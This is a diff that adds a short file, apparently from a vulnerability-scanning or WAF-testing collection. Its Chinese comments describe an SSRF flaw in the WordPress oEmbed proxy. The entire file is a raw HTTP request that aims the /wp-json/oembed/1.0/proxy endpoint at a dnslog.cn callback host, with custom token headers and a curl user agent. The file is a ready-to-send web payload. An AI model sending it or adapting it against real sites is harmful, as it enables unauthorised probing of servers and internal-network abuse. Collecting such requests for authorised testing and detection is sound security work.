@@ -1,0 +1,9 @@
+# Wordpress Oembed Proxy服务器请求伪造漏洞
+# 由于 OAuth 中的错误配置而导致的SSRF漏洞
+GET /wp-json/oembed/1.0/proxy?url=http://xxx.dnslog.cn/&acid=80001708&bid=hd_tag_m8mv25h5 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25h5
+RM-PRO-Token: 54bf5e7dbc9a124fb4c7dada0830116a
+RM-PRO-Time: 1742808468244
+User-Agent: curl/7.83.1
+
